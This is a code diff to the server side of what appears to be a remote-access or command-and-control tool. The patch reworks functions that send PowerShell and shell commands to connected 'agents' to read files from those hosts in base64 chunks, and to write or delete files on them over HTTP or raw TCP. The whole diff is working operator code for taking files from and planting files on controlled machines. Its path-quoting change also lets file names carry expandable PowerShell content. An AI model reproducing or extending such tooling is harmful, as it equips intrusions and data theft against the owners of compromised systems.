@@ -202,6 +202,7 @@ def download_file_http(sid, remote_file, local_file):
 
         total_chunks = (file_size + CHUNK_SIZE - 1) // CHUNK_SIZE
         collected_b64 = ""
+        collection = bytearray()
 
         with tqdm(total=total_chunks, desc="Downloading", unit="chunk") as pbar:
             for i in range(total_chunks):
@@ -213,18 +214,35 @@ def download_file_http(sid, remote_file, local_file):
                 chunk_output = session.output_queue.get()
 
                 try:
-                    chunk_decoded = base64.b64decode(chunk_output).decode()
-                    collected_b64 += chunk_decoded
+                    chunk_decoded = base64.b64decode(chunk_output)
+                    data_decode = base64.b64decode(chunk_decoded)
+                    collection.extend(data_decode)
+                    #collected_b64 += chunk_decoded
                     pbar.update(1)
                 except Exception as e:
                     print(brightred + f"[-] Error decoding chunk {i + 1}: {e}")
                     break
 
         try:
-            decoded_file = base64.b64decode(collected_b64.encode())
+            #decoded_file = base64.b64decode(collected_b64.encode())
 
             with open(local_file, "wb") as f:
-                f.write(decoded_file)
+                f.write(collection)
+
+            with open(local_file, "rb") as f:
+                bom = f.read(2)
+
+            # UTF-16LE BOM is 0xFF 0xFE
+            if bom == b"\xff\xfe":
+                # it’s UTF-16LE — convert it in-place
+                tmp = local_file + ".utf8"
+                subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
+                os.replace(local_file + '.tmp', local_file)
+                
+                #print(f"[+] Converted {local_file} from UTF-16LE → UTF-8")
+
+            else:
+                pass
 
             print(brightgreen + f"[+] Download complete. Saved to {local_file}")
 
@@ -232,14 +250,14 @@ def download_file_http(sid, remote_file, local_file):
             print(brightred + f"[!] Error decoding final file: {e}")
 
     elif meta.get("os", "") .lower() == "windows":
-        CHUNK_SIZE = 30000  # Adjust safely for command length + base64
+        CHUNK_SIZE = 1024 * 1024  # Adjust safely for command length + base64
         MAX_CHUNKS = 10000
 
         print(brightyellow + f"[*] Downloading file from Windows agent {sid} in chunks...")
 
         # Step 1: Get file size
         size_cmd = (
-        f"$s=(Get-Item '{remote_file}').Length;"
+        f"$s=(Get-Item \"{remote_file}\").Length;"
         f"[System.Text.Encoding]::UTF8.GetBytes($s.ToString()) -join ','"
         )
 
@@ -250,13 +268,18 @@ def download_file_http(sid, remote_file, local_file):
         try:
             size_str = bytes([int(x) for x in base64.b64decode(size_b64).decode().split(",")]).decode()
             file_size = int(size_str.strip())
+            #size_str = base64.b64decode(size_b64).decode().strip()
+            #file_size = int(size_str)
 
         except Exception as e:
             print(brightred + f"[-] Failed to parse file size: {e}")
             return
 
         total_chunks = (file_size + CHUNK_SIZE - 1) // CHUNK_SIZE
-        collected_b64 = ""
+        #print(total_chunks)
+        #collected_b64 = ""
+        collected_b64 = bytearray()
+        collection = bytearray()
 
         with tqdm(total=total_chunks, desc="Downloading", unit="chunk") as pbar:
             for i in range(total_chunks):
@@ -264,7 +287,7 @@ def download_file_http(sid, remote_file, local_file):
 
                 # Step 2: Read chunk using PowerShell and base64 encode it
                 chunk_cmd = (
-                    f"$fs = [System.IO.File]::OpenRead('{remote_file}');"
+                    f"$fs = [System.IO.File]::OpenRead(\"{remote_file}\");"
                     f"$fs.Seek({offset},'Begin') > $null;"
                     f"$buf = New-Object byte[] {CHUNK_SIZE};"
                     f"$read = $fs.Read($buf, 0, {CHUNK_SIZE});"
@@ -277,8 +300,11 @@ def download_file_http(sid, remote_file, local_file):
                 chunk_output = session.output_queue.get()
 
                 try:
-                    chunk_decoded = base64.b64decode(chunk_output).decode()
-                    collected_b64 += chunk_decoded
+                    #chunk_decoded = base64.b64decode(chunk_output).decode()
+                    chunk_decoded = base64.b64decode(chunk_output)
+                    data_decode = base64.b64decode(chunk_decoded)
+                    collection.extend(data_decode)
+                    #collected_b64 += chunk_decoded
                     pbar.update(1)
 
                 except Exception as e:
@@ -287,14 +313,31 @@ def download_file_http(sid, remote_file, local_file):
 
         # Step 3: Final decode & write
         try:
-            collect_decoded = base64.b64decode(collected_b64)
-            decode_bytes = collect_decoded.decode(errors='ignore').strip()
+            #print(type(collected_b64))
+            #print(collected_b64)
+            #collect_decoded = base64.b64decode(collected_b64)
+            #decode_bytes = collect_decoded.decode(errors='ignore').strip()
             
-            with open(local_file, "w") as f:
-                f.write(decode_bytes)
+            with open(local_file, "wb") as f:
+                f.write(collection)
 
-            subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
-            os.replace(local_file + '.tmp', local_file)
+
+            with open(local_file, "rb") as f:
+                bom = f.read(2)
+
+            # UTF-16LE BOM is 0xFF 0xFE
+            if bom == b"\xff\xfe":
+                # it’s UTF-16LE — convert it in-place
+                tmp = local_file + ".utf8"
+                subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
+                os.replace(local_file + '.tmp', local_file)
+                
+                #print(f"[+] Converted {local_file} from UTF-16LE → UTF-8")
+
+            else:
+                pass
+            #subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
+            #os.replace(local_file + '.tmp', local_file)
 
             print(brightgreen + f"[+] Download complete. Saved to {local_file}")
 
@@ -387,32 +430,26 @@ def download_file_tcp(sid, remote_file, local_file):
             with open(local_file, "wb") as f:
                 f.write(final_bytes)
 
+            with open(local_file, "rb") as f:
+                bom = f.read(2)
+
+            # UTF-16LE BOM is 0xFF 0xFE
+            if bom == b"\xff\xfe":
+                # it’s UTF-16LE — convert it in-place
+                tmp = local_file + ".utf8"
+                subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
+                os.replace(local_file + '.tmp', local_file)
+                
+                #print(f"[+] Converted {local_file} from UTF-16LE → UTF-8")
+
+            else:
+                pass
+
             print(brightgreen + f"[+] Download complete. Saved to {local_file}")
 
         except Exception as e:
             print(brightred + f"[!] Error saving file: {e}")
 
-
-        """command = f"cat {remote_file} | base64 -w0"
-        b64_command = base64.b64encode(command.encode()).decode()
-        session.command_queue.put(b64_command)
-
-        print(f"[*] Downloading file from {host}...")
-
-        b64_output = session.output_queue.get()
-
-        try:
-            decode1 = base64.b64decode(b64_output)
-            decode2 = base64.b64decode(decode1)
-            agent_output = decode2.decode(errors='ignore').strip()
-
-            with open(local_file, "w") as f:
-                f.write(agent_output)
-
-            print(f"[+] Download complete. Saved to {local_file}")
-
-        except Exception as e:
-            print(f"[!] Error decoding file: {e}")"""
 
     elif meta.get("os", "").lower() == "windows":
         CHUNK_SIZE = 30000
@@ -420,13 +457,14 @@ def download_file_tcp(sid, remote_file, local_file):
         try:
             # Get file size
             size_cmd = (
-                f"$s=(Get-Item '{remote_file}').Length;"
+                f"$s=(Get-Item \"{remote_file}\").Length;"
                 f"[System.Text.Encoding]::UTF8.GetBytes($s.ToString()) -join ','"
             )
             client_socket.sendall((size_cmd + "\n").encode())
             raw_size = client_socket.recv(4096).decode()
             size_str = bytes([int(x) for x in raw_size.strip().split(",")]).decode()
             file_size = int(size_str.strip())
+            
 
         except Exception as e:
             print(brightred + f"[-] Failed to get file size: {e}")
@@ -441,7 +479,7 @@ def download_file_tcp(sid, remote_file, local_file):
             for i in range(total_chunks):
                 offset = i * CHUNK_SIZE
                 chunk_cmd = (
-                    f"$fs = [System.IO.File]::OpenRead('{remote_file}');"
+                    f"$fs = [System.IO.File]::OpenRead(\"{remote_file}\");"
                     f"$fs.Seek({offset},'Begin') > $null;"
                     f"$buf = New-Object byte[] {CHUNK_SIZE};"
                     f"$read = $fs.Read($buf, 0, {CHUNK_SIZE});"
@@ -454,15 +492,20 @@ def download_file_tcp(sid, remote_file, local_file):
                 client_socket.settimeout(3)
                 chunk_data = b""
                 try:
-                    while True:
-                        part = client_socket.recv(4096)
-                        if not part:
-                            break
+                    expected_encoded_len = int(((CHUNK_SIZE + 2) // 3) * 4)  # Base64 size
+                    while len(chunk_data) < expected_encoded_len:
+                        try:
+                            part = client_socket.recv(4096)
+                            if not part:
+                                break
 
-                        chunk_data += part
+                            chunk_data += part
 
-                        if b"==" in part or b"=" in part[-3:]:
-                            break
+                            if b"\n" in part:
+                                break
+
+                        except Exception as e:
+                            print(brightred + f"[-] ERROR an error ocurred: {e}")
 
                 except socket.timeout:
                     pass
@@ -472,6 +515,7 @@ def download_file_tcp(sid, remote_file, local_file):
                     chunk_decoded = chunk_data.decode(errors='ignore').strip()
                     #chunk_decoded = base64.b64decode(chunk_data).decode()
                     collected_b64 += chunk_decoded
+                    print(collected_b64)
                     pbar.update(1)
 
                 except Exception as e:
@@ -484,10 +528,25 @@ def download_file_tcp(sid, remote_file, local_file):
             with open(local_file, "wb") as f:
                 f.write(final_data)
 
-            subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
-            os.replace(local_file + '.tmp', local_file)
+            with open(local_file, "rb") as f:
+                bom = f.read(2)
 
-            print(brightgreen + f"[+] Download complete. Saved to {local_file}")
+            # UTF-16LE BOM is 0xFF 0xFE
+            if bom == b"\xff\xfe":
+                # it’s UTF-16LE — convert it in-place
+                tmp = local_file + ".utf8"
+                subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
+                os.replace(local_file + '.tmp', local_file)
+                
+                #print(f"[+] Converted {local_file} from UTF-16LE → UTF-8")
+
+            else:
+                pass
+
+            #subprocess.run(['iconv', '-f', 'UTF-16LE', '-t', 'UTF-8', local_file, '-o', local_file + '.tmp'])
+            #os.replace(local_file + '.tmp', local_file)
+
+            print(brightgreen + f"\n[+] Download complete. Saved to {local_file}\n")
 
         except Exception as e:
             print(brightred + f"[!] Error writing final file: {e}")
@@ -505,8 +564,8 @@ def build_chunk_upload_command(remote_file, b64chunk):
     raw_commanddata = (
         "[Console]::OutputEncoding = [System.Text.Encoding]::ASCII;"
         "[Console]::InputEncoding  = [System.Text.Encoding]::ASCII;"
-        f"$bytes = [Convert]::FromBase64String('{safe_chunk}');"
-        f"$stream = [System.IO.File]::Open('{remote_file}', 'Append', 'Write', 'None');"
+        f"$bytes = [Convert]::FromBase64String(\"{safe_chunk}\");"
+        f"$stream = [System.IO.File]::Open(\"{remote_file}\", 'Append', 'Write', 'None');"
         "$stream.Write($bytes, 0, $bytes.Length);"
         "$stream.Close()"
     )
@@ -593,7 +652,7 @@ def upload_file_http(sid, local_file, remote_file):
         total_chunks = (len(b64_data) + CHUNK_SIZE - 1) // CHUNK_SIZE
 
         # Clear existing remote file
-        clear_cmd = f"&{{ Try {{ Remove-Item -Path '{remote_file}' -ErrorAction Stop }} Catch {{ }} }}"
+        clear_cmd = f"&{{ Try {{ Remove-Item -Path \"{remote_file}\" -ErrorAction Stop }} Catch {{ }} }}"
         b64_clear = base64.b64encode(clear_cmd.encode()).decode()
         session.command_queue.put(b64_clear)
 
@@ -646,10 +705,10 @@ def upload_file_tcp(sid, local_file, remote_file):
         return
 
     if os_type == "windows":
-        clear_cmd = f"&{{ Try {{ Remove-Item -Path '{remote_file}' -ErrorAction Stop }} Catch {{ }} }}\n"
+        clear_cmd = f"&{{ Try {{ Remove-Item -Path \"{remote_file}\" -ErrorAction Stop }} Catch {{ }} }}\n"
 
     elif os_type == "linux":
-        clear_cmd = f"rm -f '{remote_file}'\n"
+        clear_cmd = f"rm -f \"{remote_file}\"\n"
 
     else:
         print(brightred + f"[-] Unsupported OS type: {os_type}")
@@ -669,7 +728,7 @@ def upload_file_tcp(sid, local_file, remote_file):
             with tqdm(total=total_chunks, desc="Uploading", unit="chunk") as pbar:
                 for i in range(total_chunks):
                     chunk = b64_data[i * CHUNK_SIZE : (i + 1) * CHUNK_SIZE]
-                    chunk_cmd = f"printf '%s' '{chunk}' | base64 -d >> '{remote_file}'\n"
+                    chunk_cmd = f"printf '%s' '{chunk}' | base64 -d >> \"{remote_file}\"\n"
 
                     try:
                         client_socket.sendall(chunk_cmd.encode())
